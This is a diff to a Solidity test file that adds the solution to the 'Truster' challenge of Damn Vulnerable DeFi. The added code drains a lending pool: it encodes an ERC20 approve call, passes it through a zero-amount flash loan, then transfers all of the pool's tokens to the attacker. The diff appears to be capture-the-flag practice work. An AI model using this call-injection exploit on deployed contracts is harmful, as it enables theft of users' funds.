@@ -4,6 +4,7 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
 
@@ -41,7 +42,10 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        bytes memory data = abi.encodeCall(IERC20.approve, (address(this), TOKENS_IN_POOL));
+        trusterLenderPool.flashLoan(0, address(this), address(dvt), data);
 
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
         /**
          * EXPLOIT END *
          */
